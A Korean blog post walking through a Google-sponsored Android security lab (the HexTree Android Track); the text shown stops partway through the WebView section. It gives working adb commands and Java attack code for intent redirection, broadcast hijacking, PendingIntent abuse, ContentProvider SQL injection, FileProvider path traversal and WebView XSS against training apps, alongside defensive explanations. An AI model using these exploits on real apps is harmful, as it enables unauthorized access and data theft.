---
layout: post
title: "HexTree Android Track 완주기 — Android 앱 공격 표면을 직접 뚫어보며 배운 것"
date: 2026-07-26
category: CTF/Wargame
author: yejunkim2000
tags: [HexTree, Android, 모바일보안, AndroidSecurity, Intent, IntentRedirect, PendingIntent, BroadcastReceiver, AIDL, Binder, ContentProvider, FileProvider, PathTraversal, WebView, CustomTabs, Frida, jadx, apktool, 리버싱, MITM, 버그바운티]
excerpt: "Android 앱은 대체 어디까지 남에게 열려 있을까. Google이 후원하는 HexTree Android Track을 처음부터 끝까지 해보면서, Activity·Service·BroadcastReceiver·ContentProvider·WebView가 각각 어떤 조건에서 다른 앱에 열리고 그 틈이 어떻게 권한 상승과 데이터 유출까지 가는지 공격자 쪽 앱을 직접 만들어 확인한 기록입니다."
---

> **트랙**: [HexTree Android Track](https://app.hextree.io/map/android) — Google이 후원하는 Android 앱 보안 실습 트랙
> **결과**: 전 코스 이수, 트랙이 내주는 문제는 모두 풀고 제출까지 완료
> **환경**: Android 13 (API 33) x86_64 에뮬레이터 · jadx 1.5.5 / apktool 3.0.2 / Frida 16.7.19
> **직접 만든 것**: 공격 앱 `io.hextree.poc`, Frida 러너, 미니 MITM 프록시·가짜 지도 서버, UI 자동화 스크립트

---

HexTree의 Android Track을 처음부터 끝까지 해봤습니다. Activity, Service, BroadcastReceiver,
ContentProvider, WebView가 각각 어떤 조건에서 다른 앱에 열리고, 그 틈이 어떻게 권한 상승이나
데이터 유출까지 이어지는지를 공격자 쪽 앱을 직접 만들어 확인해 보는 과정이었습니다.
트랙이 내주는 문제는 모두 풀었습니다.

하다 보니 계속 같은 생각이 들었습니다. `exported="true"`인지 아닌지는 사실 출발점일 뿐이고,
진짜 문제는 앱이 그 문으로 들어온 값을 얼마나 믿느냐입니다. 매니페스트는 문이 열려 있는지만
알려주고, 그 문 안쪽에서 무엇을 검사하는지는 결국 코드를 읽어야 보입니다.
이 글은 그 신뢰 경계가 무너지는 순간들을 정리한 기록입니다.

## 1. Target

| 항목 | 값 |
|---|---|
| 트랙 | HexTree Android Track — Google 후원, Android 앱 보안 전 영역을 다루는 실습 트랙 |
| 주 분석 대상 | `io.hextree.attacksurface` v1.0 (SHA-256 `2c1261e6…de65`) — 컴포넌트별 취약 패턴을 모아 둔 실습 앱 |
| 보조 대상 | `io.hextree.flagproject`, `io.hextree.reversingexample`, `io.hextree.adbtestapplication`, `io.hextree.fridatarget`, `io.hextree.weatherusa`(+update1), `io.hextree.pocketmaps` |
| 공격 앱 | `io.hextree.poc` — `hextreeio/android-poc-app` 템플릿을 가져다 직접 작성 |
| 실행 환경 | Android 13 (API 33) x86_64 에뮬레이터, AVD `HexTree`, rooted / writable-system |
| 정적 분석 | jadx 1.5.5, apktool 3.0.2, apksigner(build-tools 36.0.0) |
| 동적 분석 | Frida 16.7.19 (server/client), 직접 만든 Python 러너 |
| 빌드 | Gradle 8.9 + JDK 21 (Android Studio JBR) |
| 결과 | 전 코스 이수, 트랙이 제시한 문제는 모두 해결하고 제출 완료 |

작업 폴더는 대충 이렇게 굴러갔습니다.

```
hextree-android/
├── apks/                 대상 APK 8종
├── decompiled/           jadx(자바) · apktool(리소스·smali) 결과
├── poc-app/              공격 앱 io.hextree.poc 소스
├── frida-scripts/        계측 스크립트 + run.py(러너)
├── tools/                attack.sh · uitap.py · mitm_proxy.py · fake_map_server.py 등
└── writeup/              원고 · 스크린샷 · 증거 로그
```

## 2. Background

### 2.1 앱끼리 대화하는 통로가 곧 공격 표면

Android는 앱마다 리눅스 UID를 따로 주고 파일시스템을 갈라놓습니다. 그래서 앱이 서로 데이터를
주고받으려면 반드시 커널의 Binder를 거쳐야 하고, 그 위에 얹힌 추상화가 우리가 아는 4대 컴포넌트와
Intent입니다.

```
App A ──Intent/Binder──▶ system_server (ActivityTaskManager / PackageManager)
                              └─ exported·permission 검사 후 ──▶ App B 컴포넌트
```

결국 공격 표면은 "다른 UID가 부를 수 있는 진입점"과 "그 진입점이 입력을 얼마나 믿는지"가 만나는
자리에서 생깁니다. 앞쪽은 매니페스트만 봐도 알 수 있지만, 뒤쪽은 코드를 읽기 전까지 알 방법이
없습니다.

| 컴포넌트 | 외부 진입 API | 노출 조건 |
|---|---|---|
| Activity | `startActivity` / `startActivityForResult` | `android:exported="true"` 또는 `intent-filter` 보유 |
| Service | `startService` / `bindService` | 위와 동일 |
| BroadcastReceiver | `sendBroadcast` / `sendOrderedBroadcast` | 매니페스트 선언 + exported, 또는 `registerReceiver(..., RECEIVER_EXPORTED)` |
| ContentProvider | `ContentResolver.query/openFile` | `android:exported`(API 17+ 기본 false), `grantUriPermissions` |

### 2.2 adb로 열렸다고 취약한 건 아닙니다

실습을 시작하자마자 짚고 넘어가야 할 게 하나 있었습니다. `exported="false"`로 막아 둔 액티비티도
`adb shell am start`로는 그냥 열립니다.

```
$ adb shell am start -n io.hextree.flagproject/.FlagActivity   # exported=false
Starting: Intent { cmp=io.hextree.flagproject/.FlagActivity }
    topResumedActivity=ActivityRecord{... io.hextree.flagproject/.FlagActivity}
```

adb shell은 uid 2000(shell)이고 `android.permission.START_ANY_ACTIVITY`(signature|privileged)를
들고 있으니 당연한 결과입니다. 그래서 영향도를 판단할 때는 아무 권한 없는 서드파티 앱 기준으로
봐야 합니다. 이 글의 재현도 대부분 공격 앱 `io.hextree.poc`로 했고, adb는 사용자가 화면에서 직접
누르는 동작을 대신하는 용도로만 썼습니다.

버그바운티 리포트에서 `adb shell am start` 한 줄만 붙여 놓고 "비공개 액티비티가 열린다"고 주장하면
바로 반려당하는 이유이기도 합니다.

### 2.3 대상 앱은 리패키징을 막아 뒀습니다

Attack Surface 앱의 플래그 액티비티는 전부 `AppCompactActivity`를 상속하고, 성공했을 때
`LogHelper.appendLog(flag)`로 암호문을 풀어 보여줍니다.

```java
// AppCompactActivity.verify() — APK 서명 SHA-256을 하드코딩된 2개와 비교
if (!verify(context)) { Toast.makeText(this, "Not solved. App looks modified.", 1).show(); return; }

// LogHelper — 복호 키 = SHA-256(정렬된 tag들을 '|'로 join)[0:16], AES-ECB
tags = [ R.string.secret, packageName, "io.hextree.attacksurface.LogHelper", ...addTag(...) ]
```

여기서 두 가지가 걸립니다. 우선 앱을 뜯어고쳐 다시 서명하면 서명 해시가 달라져서 플래그가 나오지
않습니다. 그리고 복호 키가 `addTag()`로 쌓인 값에서 나오기 때문에, 조건을 진짜로 만족시키지 않으면
복호가 깨져서 이상한 바이트만 나옵니다. 대충 우회해서 화면만 띄우는 식으로는 통하지 않고, 결국
IPC로 정직하게 조건을 만들어야 한다는 뜻입니다.

첫 챌린지는 이 장치가 더 대놓고 들어가 있습니다. `hextreeio/android-challenge1`은 빌드할 때
`AndroidManifest.xml`에서 영숫자만 남긴 문자열의 SHA-256을 복호 키로 심어 둡니다.

```groovy
def cleanedString = manifestStr.replaceAll("[^A-Za-z0-9]", "")
def manifestHash  = sha256(cleanedString)      // = R.string.challenge_secret_key
```

`FlagActivity`를 `exported=true`로 바꿔서 편하게 가려고 하면 매니페스트가 바뀌고, 키가 달라지고,
복호가 깨집니다. 궁금해서 기기 없이 파이썬으로 양쪽 다 계산해 봤습니다.

```
[*] manifest sha256  = f6217023eb5371dc0b2228d96ff851b8e0295c7e15b77e05bfb3dddf380a13f0
[+] FLAG             = HXT{read-or-modify-sources-gha82f}

[!] 매니페스트 변조(FlagActivity exported=true) 시:
    manifest sha256 = dad9cdcd55d10d0428df1b68807aa7e1dd1579636e7f3085819b2d0f5e3311fe
    FLAG            = 'd\x8f\xb1\xe9\xc6…'   ← 복호 실패
```

## 3. Attack Surface Overview

뭘 하든 시작은 매니페스트입니다. apktool로 디코딩해서 바깥에서 건드릴 수 있는 진입점부터 쭉
정리했습니다.

| 종류 | exported=true | 비고 |
|---|---|---|
| Activity | Flag1~5, 7~9, 12~15, 22, 33.1, 34~37, 41, MainActivity | Flag2/3/13/14/15는 `intent-filter` 보유 |
| Activity | (false) Flag6, 10, 11, 16~21, 23~32, 33.2, 38~40 | 내부 화면 — 우회 경로를 찾아야 합니다 |
| Service | Flag24~29 전부 exported | 24·25는 action 필터, 26~29는 bind |
| Receiver | Flag16Receiver, Flag17Receiver, Flag19Widget | 전부 exported |
| Provider | `io.hextree.flag30/31/32` exported / `flag33_1`·`flag33_2`·`io.hextree.files`·`io.hextree.root`는 exported=false + `grantUriPermissions=true` | |

표를 만들어 놓고 보니 오히려 눈이 가는 쪽은 `exported=false` 목록이었습니다. 뒤에서 보겠지만
Intent Redirect, URI 권한 전파, PendingIntent 위임 같은 우회로로 결국 저기까지 들어가게 됩니다.

반복 작업이 많아서 도구를 세 개 만들어 두고 썼습니다.

| 도구 | 역할 |
|---|---|
| `tools/attack.sh` | 화면 깨우기 → 공격 실행 → logcat 필터까지 한 번에 |
| `tools/uitap.py` | uiautomator 덤프에서 텍스트로 UI 탭(선택창·알림 자동화) |
| `frida-scripts/run.py` | 깨진 frida CLI를 대체하는 Python 러너 |

## 4. Intent and Activity

### 4.1 문자열 비교는 인증이 아닙니다 (Flag 1–4)

제일 단순한 형태는 action이나 data URI만 확인하고 끝내는 코드입니다.

```java
// Flag3Activity
if (!action.equals("io.hextree.action.GIVE_FLAG")) return;
if (!data.toString().equals("https://app.hextree.io/map/android")) return;
success(this);
```

값을 그대로 맞춰주면 통과합니다.

```bash
adb shell am start -n $A.Flag2Activity -a io.hextree.action.GIVE_FLAG
adb shell am start -n $A.Flag3Activity -a io.hextree.action.GIVE_FLAG -d "https://app.hextree.io/map/android"
```

Flag4는 `INIT→PREPARE→BUILD→GET_FLAG` 순서를 지키라고 요구하는데, 정작 그 상태를 앱 안
SharedPreferences에만 들고 있습니다. 밖에서 순서대로 인텐트를 던지면 상태가 그대로 넘어갑니다.

```
I Flag4StateMachine: Transitioned from INIT to PREPARE / PREPARE to BUILD / BUILD to GET_FLAG
I Flag4: HXT{sometimes-require-multiple-calls-5133au2}
```

### 4.2 인텐트 안의 인텐트, 그리고 Intent Redirect (Flag 5–6)

Flag5는 `Intent.EXTRA_INTENT` 안에 인텐트를 하나 더 넣어서 보내야 합니다. 재미있는 건
`reason` 값에 따라 앱이 내가 준 인텐트를 대신 실행해 준다는 부분입니다.

```java
Intent inner = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
if (inner.getIntExtra("return", -1) != 42) return;
Intent next = (Intent) inner.getParcelableExtra("nextIntent");
if ("back".equals(next.getStringExtra("reason"))) success(this);
else if ("next".equals(next.getStringExtra("reason"))) startActivity(next);   // ← 리다이렉트 가젯
```

이 `startActivity(next)` 한 줄이 가젯입니다. 이걸 타면 `exported=false`인 Flag6Activity까지 갈 수
있습니다. Flag6은 `FLAG_GRANT_READ_URI_PERMISSION`이 붙은 인텐트로 실행되기를 원하는데,
그 플래그도 내가 만든 인텐트에 붙여서 넘기면 됩니다.

```java
Intent next = new Intent().setClassName(VICTIM, ACT + "Flag6Activity")
        .putExtra("reason", "next")
        .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
Intent inner = new Intent().putExtra("return", 42).putExtra("nextIntent", next);
startActivity(new Intent().setClassName(VICTIM, ACT + "Flag5Activity")
        .putExtra(Intent.EXTRA_INTENT, inner));
```

```
I Flag6: HXT{redirect-to-not-exported-n129vbs}
```

Intent Redirect가 실무에서 무서운 이유가 딱 이겁니다. 공격자가 자기 권한이 아니라 앱의 신원을 빌려서
비공개 컴포넌트를 열고, URI 권한을 받아내고, 권한이 필요한 동작을 대신 시킬 수 있습니다.

<p align="center"><img src="/assets/img/hextree-android-track/flag05_intent.png" alt="Flag5 intent dump" width="240" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag06.png" alt="Flag6" width="240" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>앱이 받은 인텐트 덤프 — 중첩 구조(<code>EXTRA_INTENT → nextIntent</code>)가 그대로 보입니다 · 리다이렉트로 도달한 비공개 액티비티</em></p>

### 4.3 호출자가 누구인지 묻는 방법 (Flag 8–9)

```java
ComponentName caller = getCallingActivity();          // startActivityForResult로 불렸을 때만 non-null
if (caller.getClassName().contains("Hextree")) { ... }  // 문자열 포함 검사
```

`getCallingActivity()`가 알려주는 건 호출한 쪽이 스스로 지은 클래스 이름입니다. 그래서 공격 앱의
액티비티 이름을 `io.hextree.poc.HextreeAttackActivity`로 지어 주는 것만으로 검사를 통과했습니다.
클래스 이름 바꾸고 빌드 한 번 하니 끝나서 조금 허무했습니다.

Flag9는 여기서 한 발 더 나가서 플래그를 `setResult` extra에 실어 돌려주기 때문에,
`onActivityResult`에서 그대로 받아집니다.

```
I POC : [Flag9] STOLEN FLAG = HXT{flag-in-result-gs891jh2}
```

호출자를 정말 확인하고 싶다면 이름이 아니라 `Binder.getCallingUid()`로 UID를 얻고 패키지 서명까지
확인해야 합니다.

### 4.4 암시적 인텐트를 가로채기 (Flag 10–12)

Flag10은 비밀을 암시적 인텐트에 담아 던집니다.

```java
Intent i = new Intent("io.hextree.attacksurface.ATTACK_ME");
i.putExtra("flag", decryptedFlag);
startActivity(i);
```

같은 action으로 intent-filter를 등록해 둔 앱이 있으면 그쪽으로 갈 수 있다는 뜻이고, 실제로
공격 앱에 필터를 달아 두니 그대로 들어왔습니다.

```xml
<intent-filter>
    <action android:name="io.hextree.attacksurface.ATTACK_ME" />
    <category android:name="android.intent.category.DEFAULT" />
</intent-filter>
```

Flag11과 12는 반대 방향입니다. 앱이 응답으로 받은 값을 검증 없이 믿기 때문에, 아무 값이나
`token=0x41414141`로 돌려줘도 통과합니다.

```java
setResult(RESULT_OK, new Intent().putExtra("token", 1094795585));
```

### 4.5 딥링크와 "브라우저에서 왔는지" (Flag 13·15)

Flag13은 브라우저에서 넘어온 요청인지를 이렇게 판단합니다.

```java
action == VIEW && categories.contains(BROWSABLE)
  && intent.getStringExtra("com.android.browser.application_id") != null
```

그런데 이 extra는 Chrome이 관례적으로 붙여 주는 값일 뿐이라, 아무 앱이나 똑같이 넣을 수 있습니다.
Flag15는 조금 더 까다로워서 `intent://` 링크로 표현 가능한 형태를 요구합니다.

```
intent://flag15#Intent;scheme=hex;action=io.hextree.action.GIVE_FLAG;
  category=android.intent.category.BROWSABLE;S.action=flag;B.flag=true;end
```

`hex://` 같은 커스텀 스킴은 누구나 자기 앱에 등록할 수 있습니다. 그래서 하이재킹도 되고 스푸핑도
됩니다. 도메인 소유를 실제로 증명하는 App Link(`https://` + `autoVerify`)와 갈리는 지점이
여기입니다.

### 4.6 역할을 URL 파라미터로 정하는 로그인 (Flag 14)

개인적으로 이번 트랙에서 가장 "실제 서비스에서 볼 것 같다" 싶었던 문제입니다. 앱은 브라우저에서
로그인한 뒤 딥링크로 토큰을 돌려받습니다.

```
hex://token?authToken=598cc075…1d992c67&type=user&authChallenge=<UUID>
```

검증 코드를 보면 나름 신경 쓴 흔적이 있습니다.

```java
if (!challenge.equals(stored)) reject;                    // 재생 방지는 있습니다
if (base64(sha256(authToken)).equals("a/AR9b0X...92w=")) {  // 토큰 유효성도 봅니다
    if (type.equals("user"))  ... 일반 로그인
    if (type.equals("admin")) ... success();                // ← 역할은 URL 파라미터
}
```

challenge도 확인하고 토큰 해시도 확인합니다. 문제는 토큰과 역할이 아무 관계가 없다는 겁니다.
정상적으로 발급받은 user 토큰을 그대로 두고 `type=user`만 `type=admin`으로 바꾸면 관리자로
처리됩니다.

```
I Flag14: hash: a/AR9b0XxHEX7zrjx5KNOENTqbsPi6IsX+MijDA/92w=
I Flag14: HXT{hijacked-login-token-abjh28a}
```

거기다 목 서버가 challenge 값과 상관없이 늘 같은 토큰을 내주고 있어서, 세션 바인딩도 사실상
없습니다. 두 개가 겹치면 그냥 수직 권한 상승입니다.

### 4.7 PendingIntent라는 위임장 (Flag 22–23)

`PendingIntent`는 "내 신원으로 이 인텐트를 대신 쏴도 좋다"고 써 준 위임장에 가깝습니다.

| 플래그 | 의미 | 보안 |
|---|---|---|
| `FLAG_IMMUTABLE` | 받는 쪽이 내용을 못 바꿈 | 권장 |
| `FLAG_MUTABLE` | 빈 필드를 `fillIn`으로 채울 수 있음 | 위험 — 컴포넌트·extra 주입 가능 |

Flag22는 내가 건네준 PendingIntent에 앱이 플래그를 실어 발사해 주는 경우입니다. Flag23은 반대로
앱이 `FLAG_MUTABLE`짜리를 암시적 인텐트에 실어 뿌리기 때문에, 그걸 받아서 비어 있는 extra를 채워
발사하면 앱 자신의 액티비티가 조건을 충족한 상태로 열립니다.

```java
PendingIntent pi = intent.getParcelableExtra("pending_intent");
pi.send(this, 0, new Intent().putExtra("code", 42));   // fillIn
```

```
I POC  : [Flag23] creator=io.hextree.attacksurface → mutating with code=42
I Flag23: HXT{teenage-mutable-intent-turtles-s2df}
```

### 4.8 재현 화면

<p align="center"><img src="/assets/img/hextree-android-track/flag01.png" alt="Flag 1" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag04.png" alt="Flag 4" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag07.png" alt="Flag 7" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag08.png" alt="Flag 8" width="170" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em><strong>1</strong> exported 액티비티 직접 실행 · <strong>4</strong> 상태 머신 순차 호출 · <strong>7</strong> OPEN → REOPEN(onNewIntent) · <strong>8</strong> 호출자 클래스명 위조</em></p>

<p align="center"><img src="/assets/img/hextree-android-track/flag10.png" alt="Flag 10" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag12.png" alt="Flag 12" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag14.png" alt="Flag 14" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag22.png" alt="Flag 22" width="170" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em><strong>10</strong> 공격 앱이 가로챈 플래그 · <strong>12</strong> LOGIN 조건 + 토큰 응답 · <strong>14</strong> <code>type=admin</code> 권한 상승 · <strong>22</strong> PendingIntent로 회수한 플래그</em></p>

## 5. Broadcast Receiver

### 5.1 열려 있는 리시버와 ordered broadcast (Flag 16–17)

```bash
adb shell am broadcast -n $R.Flag16Receiver --es flag give-flag-16
adb shell am broadcast -n $R.Flag17Receiver --es flag give-flag-17
```

```
Broadcast completed: result=-1, data="Flag 17 Completed", extras: Bundle[…]
I FlagActivity: HXT{returned-result-ds82s}
```

`am broadcast`는 결과를 받기 위해 결과 리시버를 붙이는데, 그래서 자동으로 ordered broadcast가
됩니다. 덕분에 앱의 `isOrderedBroadcast()` 조건이 알아서 만족되고, 응답 Bundle까지 콘솔에
찍힙니다. 이건 처음에 우연히 알게 됐는데, 알고 나니 편했습니다.

### 5.2 남보다 먼저 받아서 가로채기 (Flag 18)

앱은 플래그를 실어서 `io.hextree.broadcast.FREE_FLAG`를 ordered로 뿌리고, 마지막 리시버에서
`resultCode != 0`이면 성공으로 처리합니다. 그러니까 두 가지를 동시에 해야 합니다. 우선순위를 높여서
남보다 먼저 받아 extra를 챙기고, 동시에 `setResultCode(1)`로 답을 돌려줘서 앱이 스스로 성공했다고
믿게 만드는 것입니다.

여기서 한참 헤맸습니다. 매니페스트에 `priority=999`로 리시버를 등록했는데 로그에 아무것도 안
찍혔습니다. 코드를 몇 번이나 다시 봤는데, 원인은 코드가 아니라 플랫폼이었습니다. Android 8.0부터는
암시적 브로드캐스트가 매니페스트에 선언된 리시버로는 아예 가지 않습니다. 동적 등록으로 바꾸니
바로 들어왔습니다.

```java
IntentFilter f = new IntentFilter();
f.addAction("io.hextree.broadcast.FREE_FLAG");
f.setPriority(999);
registerReceiver(hijacker, f, RECEIVER_EXPORTED);   // 동적 등록이어야 받습니다
```

```
I POC : [Broadcast] STOLEN FLAG = HXT{hijacking-broadcast-intent-as91}
I Flag18Activity.BroadcastReceiver: resultCode 1
```

### 5.3 protected broadcast 우회, 그리고 알림 버튼 (Flag 19–21)

`Flag19Widget`은 `appWidgetOptions` Bundle 안에 든 정수 두 개를 봅니다. 그런데
`android.appwidget.action.APPWIDGET_UPDATE`는 시스템만 보낼 수 있는 protected broadcast라서,
그냥 보내면 이렇게 거부당합니다.

```
W ActivityManager: Permission Denial: not allowed to send broadcast
                   android.appwidget.action.APPWIDGET_UPDATE to io.hextree.attacksurface
```

막혀서 코드를 다시 보다가 검사 방식이 눈에 들어왔습니다. `action.contains("APPWIDGET_UPDATE")`,
즉 부분 문자열만 확인합니다. 그러면 액션 이름을 내 패키지 이름으로 시작하게 짓고 뒤에 저 문자열만
붙이면 됩니다.

```java
Intent i = new Intent("io.hextree.poc.APPWIDGET_UPDATE")     // contains 검사만 통과하면 됩니다
        .setClassName(VICTIM, VICTIM + ".receivers.Flag19Widget")
        .putExtra("appWidgetOptions", options);
sendBroadcast(i);
```

Flag21은 알림에 붙은 액션 버튼의 PendingIntent가 암시적 브로드캐스트라는 점을 이용합니다. 사용자가
버튼을 누르면 시스템이 그 브로드캐스트를 뿌리고, 동적으로 등록해 둔 리시버가 그걸 받습니다. 사용자
입장에서는 그냥 알림 버튼을 눌렀을 뿐인데 값이 옆 앱으로 새는 셈입니다.

<p align="center"><img src="/assets/img/hextree-android-track/flag21-notification.png" alt="Flag21 알림" width="240" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag21.png" alt="Flag21" width="240" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>알림의 "Give Flag" 버튼 — 누르는 순간 암시적 브로드캐스트가 나갑니다 · 가로챈 결과 <code>HXT{intercepted-notificaiton-ah2us}</code></em></p>

## 6. Service and Binder

### 6.1 상태를 서비스에 들고 있으면 (Flag 24–25)

```bash
adb shell am start-service -n $S.Flag24Service -a io.hextree.services.START_FLAG24_SERVICE
for a in UNLOCK1 UNLOCK2 UNLOCK3; do adb shell am start-service -n $S.Flag25Service -a io.hextree.services.$a; done
```

서비스는 프로세스당 하나만 살아 있으니 lock 상태가 호출 사이에 그대로 누적됩니다. 중간에 엉뚱한
action이 끼면 초기화되는 것까지 코드대로 재현됐습니다.

### 6.2 Messenger로 대화하기 (Flag 26–27)

Flag26은 `what=42` 하나 보내면 끝납니다. 바인드한 상대가 누구인지는 아예 보지 않습니다.
Flag27은 3단계로 늘었는데, 정작 서비스가 비밀번호를 물어보면 그대로 알려줍니다.

```
what=1 (MSG_ECHO)         data{echo:"give flag"}   → 서비스가 echo를 기억
what=2 (MSG_GET_PASSWORD) obj != null, replyTo=우리 → 서비스가 password를 회신
what=3 (MSG_GET_FLAG)     data{password:<받은 값>}  → 성공
```

```
I POC : [Flag27] reply what=2 … password=3036f658-2b6d-48e9-b0ac-15b8cae8124d
I Flag27: HXT{service-messages-js71h}
```

### 6.3 AIDL은 인터페이스 없이도 부를 수 있습니다 (Flag 28–29)

처음에는 AIDL 파일을 공격 앱에 복사해 와야 하나 고민했는데, 그럴 필요가 없었습니다. 필요한 건
DESCRIPTOR 문자열과 트랜잭션 번호(선언된 순서대로 1, 2, 3…)뿐입니다.

```java
Parcel d = Parcel.obtain(), r = Parcel.obtain();
d.writeInterfaceToken("io.hextree.attacksurface.services.IFlag28Interface");
binder.transact(1, d, r, 0);        // openFlag()
r.readException();
```

Flag29도 구조는 비슷합니다. `init()`이 비밀번호를 반환하고 `authenticate()`가 그 값을 확인하는
식이라, 트랜잭션 세 번이면 끝났습니다.

```
I POC : [Flag29] init() → 9924c372-72d3-4405-af04-fb43394261ab
I Flag29: HXT{ai-ai-aidl-service-a2si1}
```

### 6.4 아무 에러 없이 실패하던 bindService

여기서도 한동안 막혔습니다. `bindService()`가 예외 하나 없이 그냥 false만 반환했습니다. 로그에도
아무것도 안 남아서 코드를 계속 뜯어봤는데, 범인은 Android 11(API 30)의 패키지 가시성이었습니다.
공격 앱 매니페스트에 아래 선언을 넣자 바로 붙었습니다.

```xml
<queries>
    <package android:name="io.hextree.attacksurface" />
</queries>
```

명시적 `startActivity`는 가시성 없이도 되는데 `bindService`, `ContentResolver`,
`queryIntentActivities`는 막힙니다. 나중에 보니 피해 앱도 같은 이유로 `<queries>`에 자기 액션을
선언해 두고 있었습니다.

## 7. ContentProvider and FileProvider

### 7.1 selection도 projection도 결국 공격자 입력 (Flag 30–33)

`query(uri, projection, selection, selectionArgs, sortOrder)`는 인자 전부가 바깥에서 들어옵니다.
Flag32는 그중 selection을 문자열로 이어 붙입니다.

```java
String where = "visible=1" + (selection != null ? " AND (" + selection + ")" : "");
```

괄호만 맞춰서 닫아 주면 조건이 무력화됩니다.

```bash
adb shell "content query --uri content://io.hextree.flag32/flags --where \"1=1) OR (1=1\""
Row: 2 _id=3, name=flag32, value=HXT{sql-injection-in-provider-1gs82}, visible=0
```

Flag33은 한 겹 더 있습니다. provider가 `exported=false`인데도, 앱이 URI를 담은 인텐트에
`FLAG_GRANT_READ_URI_PERMISSION`을 붙여서 결과로 돌려주거나 암시적 인텐트로 뿌립니다. 권한이
인텐트를 타고 흘러오는 셈입니다. 그런데 막상 그 URI로 조회해 보면 플래그는 `Note` 테이블에 있고
`UriMatcher`가 그쪽 경로를 막아 둡니다.

selection은 이미 막혀 있어서 한참 들여다봤는데, projection은 아무도 검사하지 않고 있었습니다.
컬럼 자리에 서브쿼리를 그냥 써 봤더니 통했습니다.

```java
getContentResolver().query(uri, new String[]{
        "(SELECT title   FROM Note WHERE title='flag33') AS name",
        "(SELECT content FROM Note WHERE title='flag33') AS value"
}, null, null, null);
```

```
I POC : name=flag33 value=HXT{union-select-injection-1bs98}
```

selection만 막고 projection을 잊는 건 실무에서도 흔한 실수입니다. `SQLiteQueryBuilder`의
`setProjectionMap()`으로 컬럼 화이트리스트를 걸어 두는 게 정석입니다.

### 7.2 FileProvider 설정이 곧 노출 범위 (Flag 34–36)

Flag34는 요청한 파일 이름을 검증하지 않고, 심지어 쓰기 권한(flags=3)까지 같이 줍니다. 그래서 이런
3단 흐름이 됩니다.

1. `filename="flag34.txt"`로 URI를 받아서 내가 파일을 먼저 만든다(존재 조건 충족)
2. 다시 요청하면 앱이 `files/flags/flag34.txt`에 플래그를 기록한다
3. `filename="flags/flag34.txt"`로 URI를 받아 읽는다

Flag35는 설정이 더 대담합니다.

```xml
<!-- res/xml/rootpaths.xml -->
<paths><root-path name="root_files" path="/" /></paths>
```

파일시스템 루트를 통째로 노출하니 `../flag35.txt` 하나로 앱 데이터 디렉터리가 열립니다. 그리고
이 쓰기 권한이 그대로 Flag36으로 이어집니다. 앱이 자기 설정 파일은 당연히 믿기 때문입니다.

```java
askFile(a, "Flag35Activity", "../shared_prefs/Flag36Preferences.xml", RQ_36_PREFS);
write(a, uri, "<?xml version='1.0' ...?>\n<map>\n    <boolean name=\"solved\" value=\"true\" />\n</map>\n");
```

파일을 덮어썼는데 화면이 안 바뀌어서 잠깐 당황했습니다. SharedPreferences는 메모리에 캐시되기
때문에 프로세스를 한 번 재시작해야 반영됩니다.

```
I Flag36: HXT{overwriting-shared-prefs-034nsd}
```

### 7.3 이번엔 반대 방향 — 악성 provider (Flag 37)

Flag37Activity는 내가 넘긴 `content://` URI를 조회해서 `_display_name`과 `_size`를 그대로 믿습니다.

```java
if ("../flag37.txt".equals(displayName) && size == 1337) {
    if ("give flag".equals(readAll(openInputStream(uri)))) success();
}
```

그러면 공격 앱 쪽에 provider를 하나 만들어서 원하는 값을 보고하면 됩니다. 다른 앱이 준 URI의
파일명, 크기, MIME 타입은 전부 지어낸 값일 수 있습니다. 파일을 저장하는 코드라면 반드시
`getCanonicalPath()`로 정규화해서 기대한 디렉터리 안에 있는지 확인해야 합니다.

<p align="center"><img src="/assets/img/hextree-android-track/flag32.png" alt="Flag 32" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag33_1.png" alt="Flag 33" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag35.png" alt="Flag 35" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag37.png" alt="Flag 37" width="170" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em><strong>32</strong> selection SQL injection · <strong>33</strong> URI 권한 + projection 주입 · <strong>35</strong> <code>root-path</code> 트래버설 · <strong>37</strong> 가짜 메타데이터 provider</em></p>

## 8. WebView and CustomTabs

### 8.1 JS 브리지와 로드 URL (Flag 38–39)

```java
String url = getIntent().getStringExtra("URL");            // 외부 입력
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new JsObject(), "hextree"); // JS → 네이티브
webView.loadUrl(url);
```

로드할 페이지를 내가 정할 수 있으니 자바스크립트 한 줄이면 브리지가 호출됩니다. `data:` URL로
바로 됩니다.

```bash
adb shell am start -n $W.Flag38WebViewsActivity \
  -e URL 'data:text/html,<script>hextree.success(true)</script>'
```

Flag39는 URL이 고정이라 조금 다릅니다. 대신 extra가 페이지로 흘러 들어갑니다. 앱은 JSON으로
얌전히 직렬화해서 넘기는데, 정작 웹 쪽에서 그 값을 `innerHTML`에 그대로 꽂습니다.

```javascript
function initApp(obj) { window.hello_name.innerHTML = `Hello <b>${obj.name}</b>`; }
```

전형적인 DOM XSS라 페이로드도 교과서적입니다.

```bash
adb shell am start -n $W.Flag39WebViewsActivity -e NAME '<img src=x onerror=hextree.success()>'
```

### 8.2 file:// 페이지에 준 과한 권한 (Flag 40)

```java
settings.setAllowUniversalAccessFromFileURLs(true);   // file:// 페이지가 임의 출처를 읽습니다
Utils.writeFile(this, "token.txt", UUID.randomUUID().toString());
webView.loadUrl(getIntent().getStringExtra("URL"));
```

